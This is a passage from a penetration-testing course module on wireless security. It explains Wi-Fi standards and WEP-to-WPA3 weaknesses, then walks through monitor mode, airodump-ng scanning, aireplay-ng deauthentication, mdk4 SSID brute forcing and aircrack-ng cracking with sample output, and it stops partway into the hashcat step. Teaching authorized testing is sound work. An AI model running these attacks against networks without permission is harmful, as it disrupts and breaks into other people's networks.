---
layout: default
title: "Module 10 — Wireless Security"
nav_order: 11
---

# Module 10 — Wireless Security
{: .no_toc }

Wireless networks are everywhere, and their security (or lack thereof) is one of the most impactful areas in penetration testing. This module covers wireless networking fundamentals, security protocols from WEP through WPA3, practical attacks on your own test networks, Bluetooth security, and defense strategies.

{: .danger }
> **Legal Warning**: Attacking wireless networks you do not own or have explicit written authorization to test is a federal crime under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide. All exercises in this module must be performed on **your own equipment** or with **documented written permission**. Unauthorized wireless interception can also violate wiretapping laws. Always operate within legal boundaries.

<details open markdown="block">
  <summary>Table of Contents</summary>
  {: .text-delta }
- TOC
{:toc}
</details>

---

## Wireless Networking Fundamentals

### IEEE 802.11 Standards

The IEEE 802.11 family defines wireless LAN (WLAN) standards. Each amendment introduced improvements in speed, range, and efficiency.

| Standard | Name | Frequency | Max Speed | Range (Indoor) | Year | Key Feature |
|----------|------|-----------|-----------|----------------|------|-------------|
| 802.11a | Wi-Fi 1 | 5 GHz | 54 Mbps | ~35m | 1999 | OFDM modulation |
| 802.11b | Wi-Fi 1 | 2.4 GHz | 11 Mbps | ~38m | 1999 | DSSS, first mass adoption |
| 802.11g | Wi-Fi 3 | 2.4 GHz | 54 Mbps | ~38m | 2003 | OFDM at 2.4 GHz |
| 802.11n | Wi-Fi 4 | 2.4/5 GHz | 600 Mbps | ~70m | 2009 | MIMO, channel bonding (40 MHz) |
| 802.11ac | Wi-Fi 5 | 5 GHz | 6.93 Gbps | ~35m | 2013 | MU-MIMO, 80/160 MHz channels |
| 802.11ax | Wi-Fi 6/6E | 2.4/5/6 GHz | 9.6 Gbps | ~30m | 2020 | OFDMA, BSS coloring, TWT |
| 802.11be | Wi-Fi 7 | 2.4/5/6 GHz | 46 Gbps | ~30m | 2024 | 320 MHz channels, MLO, 4K-QAM |

{: .note }
> Wi-Fi 6E extends Wi-Fi 6 into the 6 GHz band (5.925--7.125 GHz), adding up to 59 new 20 MHz channels in the US. Wi-Fi 7 (802.11be) introduces Multi-Link Operation (MLO), allowing simultaneous transmission across multiple bands.

### Wireless Architecture

Understanding wireless architecture terminology is essential for both attacking and defending networks.

**Station (STA)**: Any device with a wireless network interface (laptop, phone, IoT device).

**Access Point (AP)**: A networking device that bridges wireless clients to the wired network. Acts as the central hub in infrastructure mode.

**Basic Service Set (BSS)**: The fundamental building block of an 802.11 network. A single AP and its associated clients form one BSS. Each BSS is identified by its BSSID (the AP's MAC address).

**Extended Service Set (ESS)**: Multiple BSSs connected through a distribution system (usually Ethernet), sharing the same ESSID (network name). This is how enterprise Wi-Fi provides seamless roaming across floors and buildings.

**Independent Basic Service Set (IBSS)**: Ad-hoc mode where stations communicate directly without an AP. Each participating station takes turns acting as a pseudo-AP. Rarely used in modern networks.

```
Infrastructure Mode (BSS/ESS):

   [Internet]
       |
   [Router/Switch]
       |
   ┌───┴───┐
   [AP-1]  [AP-2]     ← ESS (same ESSID: "CorpNet")
    /  \     /  \
  STA  STA STA  STA   ← Clients roam between APs

Ad-Hoc Mode (IBSS):

  STA ←──→ STA
   ↕  ╲  ╱  ↕
  STA ←──→ STA         ← No AP, direct peer-to-peer
```

### Channels and Frequency Bands

**2.4 GHz Band (2.400--2.4835 GHz)**:
- 14 channels (1--13 widely available, 14 Japan-only)
- Each channel is 22 MHz wide
- Only 3 non-overlapping channels: **1, 6, 11**
- Better wall penetration, longer range
- More interference (microwaves, Bluetooth, baby monitors, other Wi-Fi)

**5 GHz Band (5.150--5.825 GHz)**:
- 25+ non-overlapping 20 MHz channels (varies by regulatory domain)
- Supports 40, 80, and 160 MHz channel bonding
- Shorter range, less wall penetration
- Less interference, more available spectrum
- Some channels require DFS (Dynamic Frequency Selection) to avoid radar

**6 GHz Band (5.925--7.125 GHz)**:
- Available with Wi-Fi 6E and Wi-Fi 7
- 59 new 20 MHz channels (US), 24 in EU
- Supports 20, 40, 80, 160, and 320 MHz (Wi-Fi 7) channels
- Least interference, newest spectrum allocation
- No legacy device support (clean slate)

```
2.4 GHz Channel Overlap:

Channel:  1    2    3    4    5    6    7    8    9   10   11   12   13
         |===========|
              |===========|
                   |===========|
                        |===========|
                             |===========|
                                  |===========|
                                       |===========|

Non-overlapping: Ch 1 ─────── Ch 6 ─────── Ch 11
```

### SSID, BSSID, ESSID

| Identifier | What It Is | Example |
|-----------|------------|---------|
| **SSID** | Service Set Identifier — the human-readable network name | `HomeNetwork` |
| **BSSID** | Basic Service Set Identifier — the MAC address of the AP's radio interface | `AA:BB:CC:DD:EE:FF` |
| **ESSID** | Extended Service Set Identifier — the SSID shared across multiple APs in a roaming environment | `CorpWiFi` (same name on 50 APs) |

{: .note }
> In practice, SSID and ESSID are often used interchangeably. The distinction matters in enterprise environments with multiple APs sharing one network name. Each AP has a unique BSSID but the same ESSID.

### Wireless Frame Types

All 802.11 communication uses three frame types. Understanding these is critical for wireless attacks.

**Management Frames** — Establish and maintain connections:

| Frame | Purpose |
|-------|---------|
| Beacon | AP advertises its existence (SSID, capabilities, rates) — broadcast every ~102.4ms |
| Probe Request | Client searching for networks (directed or broadcast) |
| Probe Response | AP responds to a probe request with its details |
| Authentication | Client requests authentication to the AP |
| Deauthentication | Disconnects a client (commonly spoofed in attacks) |
| Association Request | Client requests to join the BSS |
| Association Response | AP accepts or rejects the association |
| Reassociation | Client moves between APs in the same ESS |
| Disassociation | Graceful disconnection |

**Control Frames** — Assist data delivery:

| Frame | Purpose |
|-------|---------|
| RTS (Request to Send) | Station requests permission to transmit |
| CTS (Clear to Send) | AP grants permission |
| ACK (Acknowledgment) | Confirms frame receipt |
| PS-Poll | Power-save client requests buffered frames |
| Block ACK | Acknowledges multiple frames at once |

**Data Frames** — Carry actual payload:

| Frame | Purpose |
|-------|---------|
| Data | Standard data frame with payload |
| Null Data | No payload (used for power management signaling) |
| QoS Data | Data with Quality of Service priority tags |

{: .warning }
> Management frames in WPA2 are **not encrypted or authenticated** by default. This is why deauthentication attacks work — an attacker can forge deauth frames. WPA3 introduces Protected Management Frames (PMF/802.11w) as mandatory, mitigating this attack vector.

### Beacon Frames, Probes, Authentication, and Association

The connection process for a client joining a Wi-Fi network follows a specific sequence:

```
Client (STA)                              Access Point (AP)
     |                                          |
     |      1. Beacon Frame (broadcast)         |
     |  <────────────────────────────────────── |  AP announces itself
     |                                          |
     |      2. Probe Request                    |
     |  ──────────────────────────────────────> |  Client asks "Are you there?"
     |                                          |
     |      3. Probe Response                   |
     |  <────────────────────────────────────── |  AP replies with capabilities
     |                                          |
     |      4. Authentication Request           |
     |  ──────────────────────────────────────> |  Open System or SAE
     |                                          |
     |      5. Authentication Response          |
     |  <────────────────────────────────────── |  AP accepts
     |                                          |
     |      6. Association Request              |
     |  ──────────────────────────────────────> |  Client requests to join
     |                                          |
     |      7. Association Response             |
     |  <────────────────────────────────────── |  AP assigns AID
     |                                          |
     |  ═══  4-Way Handshake (WPA/WPA2)  ═══   |  Key derivation
     |                                          |
     |      8. Encrypted Data Exchange          |
     |  <──────────────────────────────────────>|  Normal traffic
```

### The 4-Way Handshake (WPA/WPA2) in Detail

The 4-way handshake is the mechanism that derives per-session encryption keys without transmitting the actual passphrase. This is the handshake attackers capture to perform offline cracking.

**Pre-Handshake Key Derivation**:

1. The **PSK (Pre-Shared Key)** is derived from the passphrase: `PSK = PBKDF2(passphrase, SSID, 4096, 256)` — this produces a 256-bit key
2. The PSK becomes the **PMK (Pairwise Master Key)**
3. In Enterprise mode, the PMK is derived from the RADIUS authentication instead

**The 4 Messages**:

```
Client (Supplicant)                    Access Point (Authenticator)
     |                                          |
     |  ←──── Message 1 (ANonce) ────────────── |
     |  AP sends a random nonce (ANonce)        |
     |                                          |
     |  Client now has: PMK + ANonce + SNonce   |
     |  Client derives PTK:                     |
     |  PTK = PRF(PMK, ANonce, SNonce,          |
     |            AP_MAC, Client_MAC)           |
     |                                          |
     |  ──── Message 2 (SNonce + MIC) ────────> |
     |  Client sends its nonce + integrity check|
     |                                          |
     |  AP now has: PMK + ANonce + SNonce       |
     |  AP derives same PTK                     |
     |  AP verifies MIC (proves client has PMK) |
     |                                          |
     |  ←── Message 3 (GTK + MIC, encrypted) ── |
     |  AP sends Group Temporal Key             |
     |  (for broadcast/multicast traffic)       |
     |                                          |
     |  ──── Message 4 (ACK) ──────────────────>|
     |  Client confirms key installation        |
     |                                          |
     |  ═══ Encrypted communication begins ═══  |
```

**Key Hierarchy**:

| Key | Full Name | Purpose |
|-----|-----------|---------|
| PSK | Pre-Shared Key | Derived from passphrase + SSID |
| PMK | Pairwise Master Key | = PSK in Personal mode; from RADIUS in Enterprise |
| PTK | Pairwise Transient Key | Session key for unicast traffic (derived in handshake) |
| GTK | Group Temporal Key | Shared key for broadcast/multicast traffic |
| KCK | Key Confirmation Key | Part of PTK, used to compute MIC |
| KEK | Key Encryption Key | Part of PTK, used to encrypt GTK delivery |
| TK | Temporal Key | Part of PTK, used for actual data encryption |

{: .tip }
> The 4-way handshake is the target of WPA/WPA2 cracking attacks. If an attacker captures all 4 messages (or even messages 1 and 2, or 2 and 3), they can attempt offline dictionary attacks against the passphrase. The handshake itself never contains the password — only material to verify guesses.

---

## Wireless Security Protocols

### WEP (Wired Equivalent Privacy) — Fundamentally Broken

WEP was the original 802.11 encryption standard, ratified in 1999. It uses the **RC4 stream cipher** with a 24-bit Initialization Vector (IV).

**How WEP Works**:
1. A shared key (40-bit or 104-bit) is configured on both AP and client
2. A 24-bit IV is prepended to the key, creating the per-packet key: `IV + WEP_Key`
3. RC4 generates a keystream from this combined key
4. Plaintext is XORed with the keystream to produce ciphertext
5. An ICV (Integrity Check Value) using CRC-32 provides integrity checking

**Why WEP Is Broken**:

| Vulnerability | Description |
|--------------|-------------|
| **Small IV Space** | 24-bit IV = only 16.7 million possible values. On a busy network, IVs repeat within hours |
| **IV Collision** | When two packets use the same IV, XORing the ciphertexts cancels the keystream, revealing plaintext relationships |
| **Weak IV (FMS Attack)** | Fluhrer, Mantin, and Shamir discovered that certain IVs leak information about the key. ~60,000 weak IVs can recover the full key |
| **KoreK/PTW Attack** | Improved statistical attacks requiring as few as 20,000--40,000 packets |
| **CRC-32 Integrity** | CRC-32 is not cryptographically secure. Attackers can modify packets and recalculate the CRC without knowing the key |
| **No Key Management** | Static keys shared among all users; no per-user or per-session keys |
| **No Replay Protection** | Packets can be captured and retransmitted |

**How WEP Cracking Works**:
1. Attacker puts adapter in monitor mode
2. Captures packets, focusing on collecting unique IVs
3. Uses ARP replay attack to generate traffic (more IVs faster)
4. Statistical analysis (PTW or FMS/KoreK) recovers the key
5. Typically takes 5--15 minutes on an active network

{: .danger }
> WEP provides virtually no security. It can be cracked in minutes regardless of password complexity. If you encounter WEP on a network audit, it should be flagged as a **critical finding**. There is no safe way to use WEP.

### WPA (Wi-Fi Protected Access) — Interim Fix

WPA was introduced in 2003 as a stopgap while WPA2 (full 802.11i) was being finalized. It uses **TKIP (Temporal Key Integrity Protocol)** over the existing WEP hardware.

**TKIP Improvements Over WEP**:
- **Per-packet key mixing**: Each packet gets a unique RC4 key derived from a temporal key, the transmitter MAC, and a sequence counter
- **48-bit IV** (called TSC — TKIP Sequence Counter): Eliminates IV exhaustion
- **Message Integrity Check (Michael)**: Replaces CRC-32 with a cryptographic (though weak) integrity algorithm
- **Replay protection**: Sequence counter rejects out-of-order packets
- **Key rotation**: Temporal keys are periodically refreshed

**Remaining WPA/TKIP Flaws**:
- Still uses RC4 (inherited from WEP hardware compatibility)
- Michael MIC is weak — the Beck-Tews attack (2008) can decrypt short packets and inject up to 7 forged packets
- Ohigashi-Morii attack improved Beck-Tews to a practical man-in-the-middle scenario
- TKIP was deprecated by the Wi-Fi Alliance in 2012

### WPA2 — The Standard (2004--Present)

WPA2 implements the full IEEE 802.11i standard and introduced **CCMP (Counter Mode CBC-MAC Protocol)** based on **AES-128**.

**WPA2-Personal (PSK)**:
- Uses a Pre-Shared Key (passphrase)
- All users share the same passphrase
- PMK is derived via PBKDF2: `PBKDF2(passphrase, SSID, 4096 iterations, 256-bit output)`
- Suitable for home and small office networks

**WPA2-Enterprise (802.1X/RADIUS)**:
- Each user authenticates individually via a RADIUS server
- Supports multiple EAP methods:
  - **EAP-TLS**: Mutual certificate authentication (most secure)
  - **PEAP**: Server certificate + username/password (most common)
  - **EAP-TTLS**: Similar to PEAP, more flexible inner methods
  - **EAP-FAST**: Cisco proprietary, PAC-based
- Per-user, per-session PMK derived from the authentication exchange
- Centralized access control, user revocation, logging

**WPA2 Vulnerabilities**:

| Vulnerability | Description |
|--------------|-------------|
| **Offline dictionary attack** | Captured handshake allows unlimited offline password guessing |
| **KRACK (2017)** | Key Reinstallation Attack — forces nonce reuse in the 4-way handshake, enabling decryption and injection. Patched in most modern implementations |
| **PMKID attack (2018)** | Capture PMKID from the first EAPOL frame without a full handshake or deauthentication. Stealthier than traditional capture |
| **Weak passphrases** | Short or dictionary-based passwords can be cracked quickly |
| **Unprotected management frames** | Deauthentication and disassociation attacks possible |

### WPA3 — Current Generation (2018+)

WPA3 addresses the known weaknesses of WPA2 with significant cryptographic improvements.

**WPA3-Personal — SAE (Simultaneous Authentication of Equals)**:
- Replaces the PSK 4-way handshake with the **Dragonfly key exchange** (based on elliptic curve cryptography)
- **Forward secrecy**: Even if the passphrase is later compromised, previously captured traffic cannot be decrypted
- **Resistance to offline dictionary attacks**: SAE uses a zero-knowledge proof — each password guess requires an active interaction with the AP
- **Protection against passive eavesdropping**: The handshake produces a unique PMK even if the same password is used
- Mandatory Protected Management Frames (PMF/802.11w)

**WPA3-Enterprise**:
- 192-bit minimum security suite (CNSA/Suite B cryptography)
- GCMP-256 encryption, SHA-384 for key derivation
- BIP-GMAC-256 for management frame protection
- Designed for government, finance, and high-security environments

**WPA3 Transition Mode**:
- Allows WPA2 and WPA3 clients to connect to the same AP
- WPA2 clients use PSK, WPA3 clients use SAE
- Necessary for gradual migration but reduces security for WPA3 clients

**Dragonblood Attacks (2019)**:

Researchers Mathy Vanhoef and Eyal Ronen discovered vulnerabilities in the WPA3 SAE handshake:

| Attack | Description |
|--------|-------------|
| **Downgrade to WPA2** | In transition mode, force clients to use WPA2 PSK and then perform traditional offline attacks |
| **Side-channel (cache-based)** | Timing and cache-access patterns during Dragonfly can leak information about the password |
| **Side-channel (group downgrade)** | Force use of weaker elliptic curve groups, then mount a dictionary attack |
| **Denial of Service** | SAE is computationally expensive; flooding an AP with SAE commit messages can exhaust resources |

{: .note }
> The Dragonblood vulnerabilities were patched in updated WPA3 implementations. The side-channel attacks require proximity and sophisticated measurement. WPA3 remains significantly more secure than WPA2, and the Wi-Fi Alliance released implementation guidance to address these issues.

### WPS (Wi-Fi Protected Setup) — PIN Vulnerability

WPS was designed to simplify connecting devices to a network using an 8-digit PIN printed on the AP.

**The Critical Flaw**:
- The 8-digit PIN is validated in **two halves** (4 + 3 digits + 1 checksum)
- First half: 10,000 possibilities (0000--9999)
- Second half: 1,000 possibilities (000--999, last digit is checksum)
- Total: **11,000 combinations** instead of 100,000,000
- At ~1 attempt per second with no lockout, cracked in **~3 hours**

**WPS Attack Methods**:
- **Online brute force**: Try all 11,000 PIN combinations (Reaver, Bully)
- **Pixie Dust**: Exploit weak random number generation in some chipsets to calculate the PIN from a single exchange (seconds instead of hours)
- **Physical access**: Read the PIN printed on the router label

{: .warning }
> Many routers implement WPS lockout after failed attempts, but some can be bypassed with timing delays. Some routers have WPS permanently enabled with no way to fully disable it. During a pentest, always check for WPS — it is often the weakest link.

### Open Networks and Captive Portal Security

**Open (Unencrypted) Networks**:
- No encryption; all traffic visible to anyone in range
- Common in hotels, airports, coffee shops
- All HTTP traffic can be intercepted (HTTPS remains encrypted but metadata is visible)

**OWE (Opportunistic Wireless Encryption)**:
- Wi-Fi Alliance's "Enhanced Open" (part of WPA3)
- Provides encryption without authentication (like HTTPS without certificate validation)
- Prevents passive eavesdropping on open networks
- Uses Diffie-Hellman key exchange — each client gets a unique encryption key
- Does not protect against active MitM attacks

**Captive Portal Risks**:
- Traffic before portal authentication is unencrypted
- Portal pages themselves may be vulnerable to XSS, SQL injection
- Credential harvesting through fake portals (Evil Twin)
- DNS and DHCP manipulation to redirect users
- Portals often only check MAC address — easily spoofed to bypass payment

---

## Wireless Adapter for Kali on UTM

### The Challenge: USB WiFi on UTM/Apple Silicon

Built-in Wi-Fi adapters on Macs cannot be passed through to virtual machines in UTM (or any hypervisor) because macOS keeps exclusive control of the wireless chipset. You need a **dedicated USB WiFi adapter** that supports:

1. **Monitor mode** — Passive packet capture of all wireless frames
2. **Packet injection** — Sending crafted frames (deauth, fake beacons, etc.)
3. **Linux driver support** — Specifically for ARM64 (aarch64) since Kali on Apple Silicon is ARM-based

{: .warning }
> Not all WiFi adapters support monitor mode and packet injection. Consumer adapters from Intel, Broadcom, and Qualcomm typically do not. You need adapters with chipsets that have open or hackable Linux drivers.

### Recommended Adapters for Kali ARM64

| Adapter | Chipset | Band | Monitor Mode | Injection | Linux Support | Price |
|---------|---------|------|:------------:|:---------:|:-------------:|:-----:|
| **Alfa AWUS036AXML** | MediaTek MT7921AU | 2.4/5/6 GHz | Yes | Yes | Excellent (in-kernel) | ~$50 |
| **Alfa AWUS036ACH** | Realtek RTL8812AU | 2.4/5 GHz | Yes | Yes | Good (DKMS) | ~$45 |
| **Alfa AWUS036ACM** | MediaTek MT7612U | 2.4/5 GHz | Yes | Yes | Excellent (in-kernel) | ~$40 |
| **Panda PAU09** | Ralink RT5572 | 2.4/5 GHz | Yes | Yes | Good (in-kernel) | ~$20 |

{: .tip }
> The **Alfa AWUS036AXML** is the best choice for Apple Silicon Kali setups. It uses the MediaTek MT7921AU chipset with in-kernel Linux drivers (no DKMS headaches), supports Wi-Fi 6 (802.11ax), and works reliably with USB passthrough on UTM. The **AWUS036ACM** is a solid budget alternative with similar in-kernel support.

### Driver Installation on Kali ARM64

**For MediaTek-based adapters (AXML, ACM)** — usually works out of the box:

```bash
# Check if the adapter is detected
lsusb
# Look for: MediaTek Inc. Wireless_Device or similar

# The mt76 driver family is in the mainline kernel
# Verify the module is loaded
lsmod | grep mt76

# If not loaded automatically
sudo modprobe mt7921u    # For AXML (MT7921AU)
sudo modprobe mt76x2u    # For ACM (MT7612U)

# Verify the interface appeared
iwconfig
# Expected output:
# wlan0     IEEE 802.11  ESSID:off/any
#           Mode:Managed  Access Point: Not-Associated
#           ...
```

**For Realtek RTL8812AU (AWUS036ACH)** — requires DKMS driver:

```bash
# Install the DKMS driver package
sudo apt update
sudo apt install realtek-rtl88xxau-dkms

# If the packaged driver does not work, build from source
sudo apt install dkms git build-essential linux-headers-$(uname -r)
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au

# For ARM64, set the platform
sed -i 's/CONFIG_PLATFORM_I386_PC = y/CONFIG_PLATFORM_I386_PC = n/' Makefile
sed -i 's/CONFIG_PLATFORM_ARM64_RPI = n/CONFIG_PLATFORM_ARM64_RPI = y/' Makefile

# Build and install
sudo make dkms_install

# Load the module
sudo modprobe 88XXau

# Verify
iwconfig
```

### USB Passthrough Configuration in UTM

1. **Plug in the USB WiFi adapter** to your Mac
2. In UTM, select your Kali VM and click **Edit** (the gear icon)
3. Go to **USB** in the sidebar
4. Check **USB Support** and select **USB 3.0 (xHCI)**
5. Under **USB Devices**, click the **+** button
6. Select your WiFi adapter from the list (it will show the chipset name)
7. Start the Kali VM — the adapter should be passed through

{: .note }
> If the adapter does not appear in UTM's USB device list, try unplugging and re-plugging it. macOS may need to release the device. You can also use `system_profiler SPUSBDataType` in a Mac terminal to verify the adapter is recognized.

### Verifying the Adapter in Kali

```bash
# Check USB detection
lsusb
# Expected: Bus 001 Device 003: ID 0bda:8812 Realtek Semiconductor Corp. RTL8812AU ...

# Check wireless interface
iwconfig
# Expected:
# wlan0     IEEE 802.11  ESSID:off/any
#           Mode:Managed  Frequency:2.437 GHz  Access Point: Not-Associated
#           Retry short limit:7   RTS thr:off   Fragment thr:off
#           Power Management:off

# Detailed interface info
iw dev
# Expected:
# phy#0
#   Interface wlan0
#     ifindex 3
#     wdev 0x1
#     addr aa:bb:cc:dd:ee:ff
#     type managed
#     channel 6 (2437 MHz), width: 20 MHz, center1: 2437 MHz

# Check supported modes (look for "monitor")
iw phy phy0 info | grep -A 10 "Supported interface modes"
# Expected:
#   Supported interface modes:
#     * IBSS
#     * managed
#     * AP
#     * monitor      <-- THIS IS REQUIRED
#     * P2P-client
#     * P2P-GO

# Check with airmon-ng
sudo airmon-ng
# Expected:
# PHY     Interface   Driver      Chipset
# phy0    wlan0       88XXau      Realtek Semiconductor Corp. RTL8812AU
```

---

## Wireless Reconnaissance

{: .danger }
> Passive reconnaissance (monitoring only) exists in a legal gray area in many jurisdictions. Active attacks such as deauthentication are clearly illegal without authorization. All commands below should only be used on networks you own or have written permission to test.

### Enabling Monitor Mode

Monitor mode allows the adapter to capture all wireless frames on a channel, not just those addressed to it.

```bash
# Check for interfering processes
sudo airmon-ng check
# Expected:
# Found 3 processes that could cause trouble:
# PID  Name
# 512  NetworkManager
# 641  wpa_supplicant
# 723  dhclient

# Kill interfering processes
sudo airmon-ng check kill
# Expected:
# Killing these processes:
# PID  Name
# 512  NetworkManager
# 641  wpa_supplicant
# 723  dhclient

# Enable monitor mode
sudo airmon-ng start wlan0
# Expected:
# PHY     Interface   Driver      Chipset
# phy0    wlan0       88XXau      Realtek Semiconductor Corp. RTL8812AU
#               (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
#               (mac80211 station mode vif disabled for [phy0]wlan0)

# Verify monitor mode
iwconfig wlan0mon
# Expected:
# wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.437 GHz  Tx-Power=20 dBm
#           ...
```

{: .tip }
> Alternatively, you can enable monitor mode manually with `iw`: `sudo ip link set wlan0 down && sudo iw dev wlan0 set type monitor && sudo ip link set wlan0 up`. This avoids renaming the interface to `wlan0mon`.

### Scanning Networks with airodump-ng

```bash
# Scan all channels on all bands
sudo airodump-ng wlan0mon
```

**Understanding airodump-ng Output**:

```
 CH  6 ][ Elapsed: 30 s ][ 2026-02-28 14:30

 BSSID              PWR  Beacons  #Data  #/s  CH  MB   ENC   CIPHER AUTH  ESSID

 AA:BB:CC:DD:EE:01  -45  120      450    15   6   54e  WPA2  CCMP   PSK   HomeNetwork
 AA:BB:CC:DD:EE:02  -67  85       12     0    1   130  WPA2  CCMP   PSK   OfficeWiFi
 AA:BB:CC:DD:EE:03  -78  45       0      0    11  54   WEP   WEP          OldRouter
 AA:BB:CC:DD:EE:04  -82  30       234    8    6   270  WPA3  CCMP   SAE   SecureNet
 AA:BB:CC:DD:EE:05  -55  95       89     3    6   130  WPA2  CCMP   MGT   CorpEnterprise
 AA:BB:CC:DD:EE:06  -90  15       0      0    3   54   OPN                FreeWiFi

 BSSID              STATION            PWR   Rate  Lost  Frames  Notes  Probes

 AA:BB:CC:DD:EE:01  11:22:33:44:55:01  -35   54e-54  0    312
 AA:BB:CC:DD:EE:01  11:22:33:44:55:02  -52   54e-48  2    189           HomeNetwork
 AA:BB:CC:DD:EE:04  11:22:33:44:55:03  -60   130-130 0    456           SecureNet
 (not associated)   11:22:33:44:55:04  -45   0 - 1   0    23            OldWork,Cafe
```

**Column Definitions**:

| Column | Meaning |
|--------|---------|
| **BSSID** | MAC address of the AP |
| **PWR** | Signal strength (dBm). -30 is strong, -90 is weak |
| **Beacons** | Number of beacon frames received |
| **#Data** | Number of data frames captured |
| **#/s** | Data frames per second (indicates active traffic) |
| **CH** | Channel the AP operates on |
| **MB** | Maximum speed supported (e = 802.11n, number = Mbps) |
| **ENC** | Encryption type (WEP, WPA, WPA2, WPA3, OPN) |
| **CIPHER** | Cipher suite (CCMP = AES, TKIP, WEP) |
| **AUTH** | Authentication (PSK, SAE, MGT = 802.1X, OPN) |
| **ESSID** | Network name |
| **STATION** | Client MAC address |
| **Rate** | Transmit-Receive rate |
| **Lost** | Lost packets in the last 10 seconds |
| **Frames** | Total frames from this client |
| **Probes** | Networks the client is actively probing for |

### Targeted Capture

Once you identify a target network (your own test AP), focus capture on that specific channel and BSSID:

```bash
# Target specific AP and save capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:01 -w capture wlan0mon
# -c 6         : Lock to channel 6
# --bssid      : Filter for specific AP
# -w capture   : Write to files named capture-01.cap, capture-01.csv, etc.

# Expected output (focused):
# CH  6 ][ Elapsed: 1 min ][ 2026-02-28 14:32 ][ WPA handshake: AA:BB:CC:DD:EE:01
#
# BSSID              PWR  Beacons  #Data  #/s  CH  MB   ENC   CIPHER AUTH  ESSID
#
# AA:BB:CC:DD:EE:01  -45  340      1200   40   6   54e  WPA2  CCMP   PSK   HomeNetwork
#
# BSSID              STATION            PWR   Rate  Lost  Frames
#
# AA:BB:CC:DD:EE:01  11:22:33:44:55:01  -35   54e-54  0    890
# AA:BB:CC:DD:EE:01  11:22:33:44:55:02  -52   54e-48  2    567
```

### Identifying Hidden SSIDs

A "hidden" SSID simply means the AP does not include the network name in beacon frames. The ESSID field appears as `<length: 0>` or blank in airodump-ng.

**Methods to Reveal Hidden SSIDs**:

```bash
# Method 1: Wait for a client to connect — the SSID appears in
# Probe Request and Association Request frames
# Just monitor with airodump-ng and wait

# Method 2: Deauthenticate a connected client (forces reconnection)
# The SSID will appear when the client reassociates
# (See deauthentication section below — only on YOUR network)

# Method 3: Use mdk3/mdk4 for SSID brute force (active, noisy)
sudo mdk4 wlan0mon p -t AA:BB:CC:DD:EE:01 -f ssid_wordlist.txt
```

{: .note }
> Hidden SSIDs provide **zero security**. They are trivially discovered through passive monitoring. Any connected client reveals the SSID in probe/association frames. Do not rely on SSID hiding as a security measure.

### Client Enumeration

The lower section of airodump-ng output shows connected clients. Key information includes:

- **Client MAC addresses** — Identify devices on the network
- **Probe requests** — Networks clients are looking for (reveals travel history, home networks)
- **Signal strength** — Estimate client proximity
- **Data rate** — Client capabilities
- **Associated BSSID** — Which AP the client is connected to; `(not associated)` means the client is probing but not connected

---

## WPA/WPA2 Attacks (Authorized Testing Only)

{: .danger }
> **CRITICAL**: The following attacks must only be performed against networks you own or have explicit written authorization to test. Unauthorized wireless attacks carry severe legal penalties including imprisonment. Set up a dedicated test AP for practice.

### 4-Way Handshake Capture

The goal is to capture the 4-way handshake between a client and AP. This handshake contains the material needed for offline password cracking.

**Method 1: Wait for Natural Connection**

Simply run airodump-ng targeting your AP and wait for a client to connect or reconnect:

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:01 -w handshake wlan0mon
# When a handshake is captured, you'll see in the top-right:
# ][ WPA handshake: AA:BB:CC:DD:EE:01
```

**Method 2: Deauthentication Attack (Force Reconnection)**

Send forged deauthentication frames to disconnect a client, forcing it to reconnect and perform a new handshake:

```bash
# In terminal 1: Run airodump-ng to capture the handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:01 -w handshake wlan0mon

# In terminal 2: Send deauth frames
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:01 -c 11:22:33:44:55:01 wlan0mon
# -0 5    : Send 5 deauthentication frames
# -a      : Target AP BSSID
# -c      : Target client MAC (omit to deauth all clients)

# Expected output:
# 14:35:22  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:01) on channel 6
# 14:35:22  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:01] [42|61 ACKs]
# 14:35:23  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:01] [38|55 ACKs]
# 14:35:24  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:01] [44|63 ACKs]
# 14:35:25  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:01] [40|58 ACKs]
# 14:35:26  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:01] [41|60 ACKs]
```

**Verifying Handshake Capture**:

```bash
# Check if the handshake was captured
# airodump-ng will show: ][ WPA handshake: AA:BB:CC:DD:EE:01

# Verify the capture file
aircrack-ng handshake-01.cap
# Expected:
# Opening handshake-01.cap
# Read 15834 packets.
#
#    #  BSSID              ESSID           ENCR   KEY MGMT   AUTH
#    1  AA:BB:CC:DD:EE:01  HomeNetwork     WPA (1 handshake)
#
# Choosing first network as target.

# More detailed verification
cowpatty -r handshake-01.cap -c
# Expected:
# Collected all necessary data to mount crack against WPA2/PSK passphrase.
```

{: .warning }
> Deauthentication attacks are **active attacks** that disrupt the target network. On networks with WPA3 or PMF (802.11w) enabled, deauth frames are rejected because management frames are authenticated. This is one reason WPA3 is more resistant to handshake capture attacks.

### Cracking WPA/WPA2

Once the handshake is captured, cracking happens **offline** — no further interaction with the target network is needed. The attacker tries passwords one by one, deriving the PMK for each and checking if the MIC matches.

**Aircrack-ng (CPU-based)**:

```bash
# Basic dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
# -w    : Wordlist file
# Expected output during cracking:
#                           Aircrack-ng 1.7
#
#       [00:01:32] 45328/14344392 keys tested (524.18 k/s)
#
#       Time left: 7 hours, 23 minutes, 8 seconds              0.32%
#
#                    KEY FOUND! [ password123 ]
#
#       Master Key     : A1 B2 C3 D4 E5 F6 78 90 ...
#       Transient Key  : 11 22 33 44 55 66 77 88 ...
#       EAPOL HMAC     : AA BB CC DD EE FF 00 11 ...

# Using a specific BSSID if multiple networks in capture
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:01 handshake-01.cap
```

**Hashcat (GPU-accelerated — much faster)**:

```bash
# First, convert the capture to hashcat format
# Install hcxtools if needed
sudo apt install hcxtools

# Convert .cap to .hc22000 (hashcat 22000 format)
